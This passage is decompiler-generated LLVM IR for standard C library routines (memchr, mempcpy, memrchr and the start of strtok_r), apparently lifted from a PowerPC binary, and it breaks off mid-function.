  br i1 %v4_10010b74, label %dec_label_pc_10010b28, label %dec_label_pc_10010b74.dec_label_pc_10010b10_crit_edge

dec_label_pc_10010b74.dec_label_pc_10010b10_crit_edge: ; preds = %dec_label_pc_10010b74
  %v1_10010b1c.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010b10

dec_label_pc_10010b80:                            ; preds = %dec_label_pc_10010b4c, %dec_label_pc_10010b40
  %v0_10010b80 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10010b80

; uselistorder directives
  uselistorder i32 %v1_10010b74, { 1, 2, 0 }
  uselistorder i32 %v1_10010b70, { 1, 0 }
  uselistorder i32 %v3_10010b6c, { 1, 2, 0 }
  uselistorder i32 %v1_10010b54, { 1, 0 }
  uselistorder i32 %v3_10010b50, { 1, 2, 0 }
  uselistorder i32 %v1_10010b28, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10010b24, { 1, 0 }
  uselistorder i32 %v2_10010b20, { 1, 2, 0 }
  uselistorder i32 %v1_10010b08, { 1, 0 }
  uselistorder i32 %v2_10010b00, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10010afc, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_10010b68.dec_label_pc_10010b68_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10010b40, { 1, 0 }
  uselistorder label %dec_label_pc_10010b28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010af8, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10010b8c = urem i32 %arg1, 256
  store i32 %v1_10010b8c, i32* %r4.global-to-local, align 4
  %v0_10010bac7 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_10010bb013 = icmp eq i32 %arg2, 0
  br i1 %v2_10010bb013, label %dec_label_pc_10010bb8, label %dec_label_pc_10010bb4

dec_label_pc_10010b98:                            ; preds = %dec_label_pc_10010bb4
  %v1_10010b98 = inttoptr i32 %v0_10010b98 to i8*
  %v2_10010b98 = load i8, i8* %v1_10010b98, align 1
  %v3_10010b98 = zext i8 %v2_10010b98 to i32
  %v0_10010b9c = load i32, i32* %r5.global-to-local, align 4
  %v1_10010b9c = add i32 %v0_10010b9c, -1
  store i32 %v1_10010b9c, i32* %r5.global-to-local, align 4
  %v1_10010ba0 = load i32, i32* %r4.global-to-local, align 4
  %v4_10010ba0 = icmp eq i32 %v3_10010b98, %v1_10010ba0
  %v0_10010ba4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010ba0, i32 %v0_10010ba4)
  %v0_10010ba8 = load i32, i32* @r3, align 4
  %v1_10010ba8 = add i32 %v0_10010ba8, 1
  store i32 %v1_10010ba8, i32* @r3, align 4
  %v0_10010bb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010bb0 = add i32 %v0_10010bb0, -1
  store i32 %v1_10010bb0, i32* %ctr.global-to-local, align 4
  %v2_10010bb0 = icmp eq i32 %v1_10010bb0, 0
  br i1 %v2_10010bb0, label %dec_label_pc_10010bb8.loopexit, label %dec_label_pc_10010bb4

dec_label_pc_10010bb4:                            ; preds = %entry, %dec_label_pc_10010b98
  %v0_10010b98 = phi i32 [ %v1_10010ba8, %dec_label_pc_10010b98 ], [ %v0_10010bac7, %entry ]
  %v0_10010bb4.in.in = phi i32 [ %v1_10010ba8, %dec_label_pc_10010b98 ], [ %v0_10010bac7, %entry ]
  %v0_10010bb4.in = urem i32 %v0_10010bb4.in.in, 4
  %v0_10010bb4 = icmp eq i32 %v0_10010bb4.in, 0
  br i1 %v0_10010bb4, label %dec_label_pc_10010bb8.loopexit, label %dec_label_pc_10010b98

dec_label_pc_10010bb8.loopexit:                   ; preds = %dec_label_pc_10010bb4, %dec_label_pc_10010b98
  %v0_10010be016.ph = phi i32 [ %v1_10010ba8, %dec_label_pc_10010b98 ], [ %v0_10010b98, %dec_label_pc_10010bb4 ]
  %v0_10010bb8.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10010bbc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010bb8

dec_label_pc_10010bb8:                            ; preds = %dec_label_pc_10010bb8.loopexit, %entry
  %v0_10010bbc = phi i32 [ 0, %entry ], [ %v0_10010bbc.pre, %dec_label_pc_10010bb8.loopexit ]
  %v0_10010bb8 = phi i32 [ %v1_10010b8c, %entry ], [ %v0_10010bb8.pre, %dec_label_pc_10010bb8.loopexit ]
  %v0_10010be016 = phi i32 [ %v0_10010bac7, %entry ], [ %v0_10010be016.ph, %dec_label_pc_10010bb8.loopexit ]
  %v1_10010bb8 = mul i32 %v0_10010bb8, 256
  %v1_10010bbc = udiv i32 %v0_10010bbc, 4
  %v2_10010bc0 = or i32 %v1_10010bb8, %v0_10010bb8
  %v1_10010bc8 = mul i32 %v2_10010bc0, 65536
  %v2_10010bd4 = or i32 %v1_10010bc8, %v2_10010bc0
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_10010bbc, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10010bbc, 4
  br i1 %tmp, label %dec_label_pc_10010c68, label %dec_label_pc_10010be0

dec_label_pc_10010be0:                            ; preds = %dec_label_pc_10010bb8, %dec_label_pc_10010c64.backedge
  %v0_10010c64 = phi i32 [ %v1_10010c64, %dec_label_pc_10010c64.backedge ], [ %v1_10010bbc, %dec_label_pc_10010bb8 ]
  %v0_10010be8 = phi i32 [ %v1_10010be8, %dec_label_pc_10010c64.backedge ], [ %v0_10010bbc, %dec_label_pc_10010bb8 ]
  %v0_10010c20 = phi i32 [ %v1_10010be4, %dec_label_pc_10010c64.backedge ], [ %v0_10010be016, %dec_label_pc_10010bb8 ]
  %v1_10010be0 = inttoptr i32 %v0_10010c20 to i32*
  %v2_10010be0 = load i32, i32* %v1_10010be0, align 4
  %v1_10010be4 = add i32 %v0_10010c20, 4
  store i32 %v1_10010be4, i32* @r3, align 4
  %v1_10010be8 = add i32 %v0_10010be8, -4
  store i32 %v1_10010be8, i32* %r5.global-to-local, align 4
  %v1_10010bec = add i32 %v0_10010c20, 1
  %v2_10010bf0 = xor i32 %v2_10010be0, %v2_10010bd4
  %v1_10010bf8 = add i32 %v2_10010bf0, 2130640639
  %v2_10010bfc = xor i32 %v1_10010bf8, %v2_10010bf0
  %v2_10010c00 = and i32 %v2_10010bfc, -2130640640
  %v6_10010c00 = icmp eq i32 %v2_10010c00, -2130640640
  br i1 %v6_10010c00, label %dec_label_pc_10010c64.backedge, label %dec_label_pc_10010c0c

dec_label_pc_10010c64.backedge:                   ; preds = %dec_label_pc_10010be0, %dec_label_pc_10010c50
  %v1_10010c64 = add i32 %v0_10010c64, -1
  store i32 %v1_10010c64, i32* %ctr.global-to-local, align 4
  %v2_10010c64 = icmp eq i32 %v1_10010c64, 0
  br i1 %v2_10010c64, label %dec_label_pc_10010c68, label %dec_label_pc_10010be0

dec_label_pc_10010c0c:                            ; preds = %dec_label_pc_10010be0
  %v2_10010c0c = inttoptr i32 %v0_10010c20 to i8*
  %v3_10010c0c = load i8, i8* %v2_10010c0c, align 1
  %v4_10010c0c = zext i8 %v3_10010c0c to i32
  %v1_10010c10 = add i32 %v0_10010c20, 3
  store i32 %v1_10010c10, i32* @r8, align 4
  %v1_10010c14 = add i32 %v0_10010c20, 2
  %v4_10010c18 = icmp eq i32 %v4_10010c0c, %v0_10010bb8
  br i1 %v4_10010c18, label %dec_label_pc_10010c20, label %dec_label_pc_10010c28

dec_label_pc_10010c20:                            ; preds = %dec_label_pc_10010c0c
  ret i32 %v0_10010c20

dec_label_pc_10010c28:                            ; preds = %dec_label_pc_10010c0c
  %v2_10010c28 = inttoptr i32 %v1_10010bec to i8*
  %v3_10010c28 = load i8, i8* %v2_10010c28, align 1
  %v4_10010c28 = zext i8 %v3_10010c28 to i32
  %v4_10010c2c = icmp eq i32 %v4_10010c28, %v0_10010bb8
  br i1 %v4_10010c2c, label %dec_label_pc_10010c34, label %dec_label_pc_10010c3c

dec_label_pc_10010c34:                            ; preds = %dec_label_pc_10010c28
  ret i32 %v1_10010bec

dec_label_pc_10010c3c:                            ; preds = %dec_label_pc_10010c28
  %v2_10010c3c = inttoptr i32 %v1_10010c14 to i8*
  %v3_10010c3c = load i8, i8* %v2_10010c3c, align 1
  %v4_10010c3c = zext i8 %v3_10010c3c to i32
  %v4_10010c40 = icmp eq i32 %v4_10010c3c, %v0_10010bb8
  br i1 %v4_10010c40, label %dec_label_pc_10010c48, label %dec_label_pc_10010c50

dec_label_pc_10010c48:                            ; preds = %dec_label_pc_10010c3c
  ret i32 %v1_10010c14

dec_label_pc_10010c50:                            ; preds = %dec_label_pc_10010c3c
  %v2_10010c50 = inttoptr i32 %v1_10010c10 to i8*
  %v3_10010c50 = load i8, i8* %v2_10010c50, align 1
  %v4_10010c50 = zext i8 %v3_10010c50 to i32
  %v4_10010c54 = icmp eq i32 %v4_10010c50, %v0_10010bb8
  br i1 %v4_10010c54, label %dec_label_pc_10010c5c, label %dec_label_pc_10010c64.backedge

dec_label_pc_10010c5c:                            ; preds = %dec_label_pc_10010c50
  ret i32 %v1_10010c10

dec_label_pc_10010c68:                            ; preds = %dec_label_pc_10010c64.backedge, %dec_label_pc_10010bb8
  %v0_10010c7426 = phi i32 [ %v0_10010be016, %dec_label_pc_10010bb8 ], [ %v1_10010be4, %dec_label_pc_10010c64.backedge ]
  %v0_10010c68 = phi i32 [ %v0_10010bbc, %dec_label_pc_10010bb8 ], [ %v1_10010be8, %dec_label_pc_10010c64.backedge ]
  %v1_10010c68 = add i32 %v0_10010c68, 1
  store i32 %v1_10010c68, i32* %r5.global-to-local, align 4
  store i32 %v0_10010c68, i32* %ctr.global-to-local, align 4
  %v2_10010c843 = icmp eq i32 %v0_10010c68, 0
  br i1 %v2_10010c843, label %dec_label_pc_10010c88, label %dec_label_pc_10010c74

dec_label_pc_10010c74:                            ; preds = %dec_label_pc_10010c68, %dec_label_pc_10010c74.dec_label_pc_10010c74_crit_edge
  %v1_10010c78 = phi i32 [ %v1_10010c78.pre, %dec_label_pc_10010c74.dec_label_pc_10010c74_crit_edge ], [ %v0_10010bb8, %dec_label_pc_10010c68 ]
  %v0_10010c74 = phi i32 [ %v1_10010c80, %dec_label_pc_10010c74.dec_label_pc_10010c74_crit_edge ], [ %v0_10010c7426, %dec_label_pc_10010c68 ]
  %v1_10010c74 = inttoptr i32 %v0_10010c74 to i8*
  %v2_10010c74 = load i8, i8* %v1_10010c74, align 1
  %v3_10010c74 = zext i8 %v2_10010c74 to i32
  %v4_10010c78 = icmp eq i32 %v3_10010c74, %v1_10010c78
  %v0_10010c7c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010c78, i32 %v0_10010c7c)
  %v0_10010c80 = load i32, i32* @r3, align 4
  %v1_10010c80 = add i32 %v0_10010c80, 1
  store i32 %v1_10010c80, i32* @r3, align 4
  %v0_10010c84 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010c84 = add i32 %v0_10010c84, -1
  store i32 %v1_10010c84, i32* %ctr.global-to-local, align 4
  %v2_10010c84 = icmp eq i32 %v1_10010c84, 0
  br i1 %v2_10010c84, label %dec_label_pc_10010c88, label %dec_label_pc_10010c74.dec_label_pc_10010c74_crit_edge

dec_label_pc_10010c74.dec_label_pc_10010c74_crit_edge: ; preds = %dec_label_pc_10010c74
  %v1_10010c78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010c74

dec_label_pc_10010c88:                            ; preds = %dec_label_pc_10010c74, %dec_label_pc_10010c68
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10010c84, { 1, 0 }
  uselistorder i32 %v1_10010c80, { 1, 0 }
  uselistorder i32 %v0_10010c68, { 1, 2, 0 }
  uselistorder i32 %v1_10010c64, { 2, 1, 0 }
  uselistorder i32 %v1_10010be8, { 0, 2, 1 }
  uselistorder i32 %v1_10010be4, { 0, 2, 1 }
  uselistorder i32 %v0_10010c20, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10010bc0, { 1, 0 }
  uselistorder i32 %v1_10010bbc, { 1, 0 }
  uselistorder i32 %v0_10010be016, { 1, 0 }
  uselistorder i32 %v0_10010bb8, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10010bbc, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10010bb0, { 1, 0 }
  uselistorder i32 %v1_10010ba8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10010bac7, { 2, 0, 1 }
  uselistorder i32 %v1_10010b8c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010c74, { 1, 0 }
  uselistorder label %dec_label_pc_10010c64.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10010be0, { 1, 0 }
  uselistorder label %dec_label_pc_10010bb4, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268504236, i32* @lr, align 4
  %v0_10010ca8 = call i32 @memcpy()
  %v0_10010cb0 = load i32, i32* @r28, align 4
  %v1_10010cb0 = load i32, i32* @r29, align 4
  %v2_10010cb0 = add i32 %v1_10010cb0, %v0_10010cb0
  ret i32 %v2_10010cb0
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10010cc8 = urem i32 %arg2, 256
  store i32 %v1_10010cc8, i32* %r4.global-to-local, align 4
  %v2_10010cd0 = add i32 %arg3, %arg1
  store i32 %v2_10010cd0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_10010cec13 = icmp eq i32 %arg3, 0
  br i1 %v2_10010cec13, label %dec_label_pc_10010cf4, label %dec_label_pc_10010cf0

dec_label_pc_10010cd8:                            ; preds = %dec_label_pc_10010cf0
  %v1_10010cd8 = add i32 %v0_10010cd8, -1
  %v2_10010cd8 = inttoptr i32 %v1_10010cd8 to i8*
  %v3_10010cd8 = load i8, i8* %v2_10010cd8, align 1
  %v4_10010cd8 = zext i8 %v3_10010cd8 to i32
  store i32 %v1_10010cd8, i32* %r3.global-to-local, align 4
  %v0_10010cdc = load i32, i32* %r5.global-to-local, align 4
  %v1_10010cdc = add i32 %v0_10010cdc, -1
  store i32 %v1_10010cdc, i32* %r5.global-to-local, align 4
  %v1_10010ce0 = load i32, i32* %r4.global-to-local, align 4
  %v4_10010ce0 = icmp eq i32 %v4_10010cd8, %v1_10010ce0
  %v0_10010ce4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010ce0, i32 %v0_10010ce4)
  %v0_10010ce8 = load i32, i32* %r3.global-to-local, align 4
  %v0_10010cec = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010cec = add i32 %v0_10010cec, -1
  store i32 %v1_10010cec, i32* %ctr.global-to-local, align 4
  %v2_10010cec = icmp eq i32 %v1_10010cec, 0
  br i1 %v2_10010cec, label %dec_label_pc_10010cf4.loopexit, label %dec_label_pc_10010cf0

dec_label_pc_10010cf0:                            ; preds = %entry, %dec_label_pc_10010cd8
  %v0_10010cd8 = phi i32 [ %v0_10010ce8, %dec_label_pc_10010cd8 ], [ %v2_10010cd0, %entry ]
  %v0_10010cf0.in.in = phi i32 [ %v0_10010ce8, %dec_label_pc_10010cd8 ], [ %v2_10010cd0, %entry ]
  %v0_10010cf0.in = urem i32 %v0_10010cf0.in.in, 4
  %v0_10010cf0 = icmp eq i32 %v0_10010cf0.in, 0
  br i1 %v0_10010cf0, label %dec_label_pc_10010cf4.loopexit, label %dec_label_pc_10010cd8

dec_label_pc_10010cf4.loopexit:                   ; preds = %dec_label_pc_10010cf0, %dec_label_pc_10010cd8
  %v0_10010d1c16.ph = phi i32 [ %v0_10010ce8, %dec_label_pc_10010cd8 ], [ %v0_10010cd8, %dec_label_pc_10010cf0 ]
  %v0_10010cf4.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10010cf8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010cf4

dec_label_pc_10010cf4:                            ; preds = %dec_label_pc_10010cf4.loopexit, %entry
  %v0_10010cf8 = phi i32 [ 0, %entry ], [ %v0_10010cf8.pre, %dec_label_pc_10010cf4.loopexit ]
  %v0_10010cf4 = phi i32 [ %v1_10010cc8, %entry ], [ %v0_10010cf4.pre, %dec_label_pc_10010cf4.loopexit ]
  %v0_10010d1c16 = phi i32 [ %v2_10010cd0, %entry ], [ %v0_10010d1c16.ph, %dec_label_pc_10010cf4.loopexit ]
  %v1_10010cf4 = mul i32 %v0_10010cf4, 256
  %v1_10010cf8 = udiv i32 %v0_10010cf8, 4
  %v2_10010cfc = or i32 %v1_10010cf4, %v0_10010cf4
  %v1_10010d04 = mul i32 %v2_10010cfc, 65536
  %v2_10010d10 = or i32 %v1_10010d04, %v2_10010cfc
  store i32 %v2_10010d10, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_10010cf8, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10010cf8, 4
  br i1 %tmp, label %dec_label_pc_10010d94, label %dec_label_pc_10010d1c

dec_label_pc_10010d1c:                            ; preds = %dec_label_pc_10010cf4, %dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge
  %v0_10010d9021 = phi i32 [ %v1_10010d90, %dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge ], [ %v1_10010cf8, %dec_label_pc_10010cf4 ]
  %v0_10010d3c = phi i32 [ %v0_10010d3c.pre, %dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge ], [ -2130640640, %dec_label_pc_10010cf4 ]
  %v0_10010d24 = phi i32 [ %v0_10010d24.pre, %dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge ], [ %v2_10010d10, %dec_label_pc_10010cf4 ]
  %v0_10010d20 = phi i32 [ %v0_10010d20.pre, %dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge ], [ %v0_10010cf8, %dec_label_pc_10010cf4 ]
  %v0_10010d1c = phi i32 [ %v0_10010d1c.pre, %dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge ], [ %v0_10010d1c16, %dec_label_pc_10010cf4 ]
  %v1_10010d1c = add i32 %v0_10010d1c, -4
  %v2_10010d1c = inttoptr i32 %v1_10010d1c to i32*
  %v3_10010d1c = load i32, i32* %v2_10010d1c, align 4
  store i32 %v1_10010d1c, i32* %r3.global-to-local, align 4
  %v1_10010d20 = add i32 %v0_10010d20, -4
  store i32 %v1_10010d20, i32* %r5.global-to-local, align 4
  %v2_10010d24 = xor i32 %v3_10010d1c, %v0_10010d24
  %v1_10010d28 = add i32 %v0_10010d1c, -3
  %v1_10010d30 = add i32 %v2_10010d24, 2130640639
  %v1_10010d38 = add i32 %v0_10010d1c, -2
  %v2_10010d34 = sub i32 -1, %v2_10010d24
  %v2_10010d3c = xor i32 %v1_10010d30, %v2_10010d34
  %v3_10010d3c = and i32 %v2_10010d3c, %v0_10010d3c
  %v6_10010d3c = icmp eq i32 %v3_10010d3c, 0
  %v1_10010d40 = add i32 %v0_10010d1c, -1
  br i1 %v6_10010d3c, label %dec_label_pc_10010d90.backedge, label %dec_label_pc_10010d48

dec_label_pc_10010d48:                            ; preds = %dec_label_pc_10010d1c
  %v2_10010d48 = inttoptr i32 %v1_10010d40 to i8*
  %v3_10010d48 = load i8, i8* %v2_10010d48, align 1
  %v4_10010d48 = zext i8 %v3_10010d48 to i32
  %v1_10010d4c = load i32, i32* %r4.global-to-local, align 4
  %v4_10010d4c = icmp eq i32 %v4_10010d48, %v1_10010d4c
  br i1 %v4_10010d4c, label %dec_label_pc_10010d54, label %dec_label_pc_10010d5c

dec_label_pc_10010d54:                            ; preds = %dec_label_pc_10010d48
  store i32 %v1_10010d40, i32* %r3.global-to-local, align 4
  ret i32 %v1_10010d40

dec_label_pc_10010d5c:                            ; preds = %dec_label_pc_10010d48
  %v2_10010d5c = inttoptr i32 %v1_10010d38 to i8*
  %v3_10010d5c = load i8, i8* %v2_10010d5c, align 1
  %v4_10010d5c = zext i8 %v3_10010d5c to i32
  %v4_10010d60 = icmp eq i32 %v4_10010d5c, %v1_10010d4c
  br i1 %v4_10010d60, label %dec_label_pc_10010d68, label %dec_label_pc_10010d70

dec_label_pc_10010d68:                            ; preds = %dec_label_pc_10010d5c
  store i32 %v1_10010d38, i32* %r3.global-to-local, align 4
  ret i32 %v1_10010d38

dec_label_pc_10010d70:                            ; preds = %dec_label_pc_10010d5c
  %v2_10010d70 = inttoptr i32 %v1_10010d28 to i8*
  %v3_10010d70 = load i8, i8* %v2_10010d70, align 1
  %v4_10010d70 = zext i8 %v3_10010d70 to i32
  %v4_10010d74 = icmp eq i32 %v4_10010d70, %v1_10010d4c
  br i1 %v4_10010d74, label %dec_label_pc_10010d7c, label %dec_label_pc_10010d84

dec_label_pc_10010d7c:                            ; preds = %dec_label_pc_10010d70
  store i32 %v1_10010d28, i32* %r3.global-to-local, align 4
  ret i32 %v1_10010d28

dec_label_pc_10010d84:                            ; preds = %dec_label_pc_10010d70
  %v1_10010d84 = inttoptr i32 %v1_10010d1c to i8*
  %v2_10010d84 = load i8, i8* %v1_10010d84, align 1
  %v3_10010d84 = zext i8 %v2_10010d84 to i32
  %v4_10010d88 = icmp eq i32 %v3_10010d84, %v1_10010d4c
  %v0_10010d8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010d88, i32 %v0_10010d8c)
  %v0_10010d90.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010d90.backedge

dec_label_pc_10010d90.backedge:                   ; preds = %dec_label_pc_10010d84, %dec_label_pc_10010d1c
  %v0_10010d90 = phi i32 [ %v0_10010d90.pre, %dec_label_pc_10010d84 ], [ %v0_10010d9021, %dec_label_pc_10010d1c ]
  %v1_10010d90 = add i32 %v0_10010d90, -1
  store i32 %v1_10010d90, i32* %ctr.global-to-local, align 4
  %v2_10010d90 = icmp eq i32 %v1_10010d90, 0
  br i1 %v2_10010d90, label %dec_label_pc_10010d90.dec_label_pc_10010d94_crit_edge, label %dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge

dec_label_pc_10010d90.backedge.dec_label_pc_10010d1c_crit_edge: ; preds = %dec_label_pc_10010d90.backedge
  %v0_10010d1c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10010d20.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10010d24.pre = load i32, i32* @r7, align 4
  %v0_10010d3c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10010d1c

dec_label_pc_10010d90.dec_label_pc_10010d94_crit_edge: ; preds = %dec_label_pc_10010d90.backedge
  %v0_10010d94.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010d94

dec_label_pc_10010d94:                            ; preds = %dec_label_pc_10010d90.dec_label_pc_10010d94_crit_edge, %dec_label_pc_10010cf4
  %v0_10010d94 = phi i32 [ %v0_10010d94.pre, %dec_label_pc_10010d90.dec_label_pc_10010d94_crit_edge ], [ %v0_10010cf8, %dec_label_pc_10010cf4 ]
  %v1_10010d94 = add i32 %v0_10010d94, 1
  store i32 %v1_10010d94, i32* %r5.global-to-local, align 4
  store i32 %v0_10010d94, i32* %ctr.global-to-local, align 4
  %v2_10010dac3 = icmp eq i32 %v0_10010d94, 0
  br i1 %v2_10010dac3, label %dec_label_pc_10010db0, label %dec_label_pc_10010da0

dec_label_pc_10010da0:                            ; preds = %dec_label_pc_10010d94, %dec_label_pc_10010da0
  %v0_10010da0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010da0 = add i32 %v0_10010da0, -1
  %v2_10010da0 = inttoptr i32 %v1_10010da0 to i8*
  %v3_10010da0 = load i8, i8* %v2_10010da0, align 1
  %v4_10010da0 = zext i8 %v3_10010da0 to i32
  store i32 %v1_10010da0, i32* %r3.global-to-local, align 4
  %v1_10010da4 = load i32, i32* %r4.global-to-local, align 4
  %v4_10010da4 = icmp eq i32 %v4_10010da0, %v1_10010da4
  %v0_10010da8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010da4, i32 %v0_10010da8)
  %v0_10010dac = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010dac = add i32 %v0_10010dac, -1
  store i32 %v1_10010dac, i32* %ctr.global-to-local, align 4
  %v2_10010dac = icmp eq i32 %v1_10010dac, 0
  br i1 %v2_10010dac, label %dec_label_pc_10010db0, label %dec_label_pc_10010da0

dec_label_pc_10010db0:                            ; preds = %dec_label_pc_10010da0, %dec_label_pc_10010d94
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10010dac, { 1, 0 }
  uselistorder i32 %v0_10010d94, { 1, 2, 0 }
  uselistorder i32 %v1_10010d90, { 2, 1, 0 }
  uselistorder i32 %v1_10010d40, { 1, 0, 2 }
  uselistorder i32 %v1_10010d38, { 1, 0, 2 }
  uselistorder i32 %v1_10010d28, { 1, 0, 2 }
  uselistorder i32 %v2_10010cfc, { 1, 0 }
  uselistorder i32 %v1_10010cf8, { 1, 0 }
  uselistorder i32 %v0_10010cf4, { 1, 0 }
  uselistorder i32 %v0_10010cf8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10010cec, { 1, 0 }
  uselistorder i32 %v0_10010ce8, { 1, 0, 2 }
  uselistorder i32 %v2_10010cd0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10010cc8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10010da0, { 1, 0 }
  uselistorder label %dec_label_pc_10010d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10010cf0, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10010dbc = load i32, i32* @lr, align 4
  store i32 %v0_10010dbc, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10010dc4 = icmp eq i32 %arg1, 0
  %v0_10010dcc = load i32, i32* @r5, align 4
  store i32 %v0_10010dcc, i32* %r30.global-to-local, align 4
  %v0_10010dd0 = load i32, i32* @r4, align 4
  store i32 %v0_10010dd0, i32* %r29.global-to-local, align 4
  br i1 %v3_10010dc4, label %dec_label_pc_10010dd8, label %dec_label_pc_10010ddc

dec_label_pc_10010dd8:                            ; preds = %entry
  %v1_10010dd8 = inttoptr i32 %v0_10010dcc to i32*
  %v2_10010dd8 = load i32, i32* %v1_10010dd8, align 4
  store i32 %v2_10010dd8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010ddc

dec_label_pc_10010ddc:                            ; preds = %entry, %dec_label_pc_10010dd8
  %v0_10010ddc = phi i32 [ %arg1, %entry ], [ %v2_10010dd8, %dec_label_pc_10010dd8 ]
  store i32 %v0_10010ddc, i32* @r3, align 4
  %v1_10010de0 = inttoptr i32 %v0_10010ddc to i8*
  %v2_10010de0 = call i32 @__GI_strspn(i8* %v1_10010de0)
  %v0_10010de4 = load i32, i32* %r29.global-to-local, align 4
  %v0_10010de8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010de8 = add i32 %v0_10010de8, %v2_10010de0
  %v3_10010de8 = inttoptr i32 %v2_10010de8 to i8*
  %v4_10010de8 = load i8, i8* %v3_10010de8, align 1
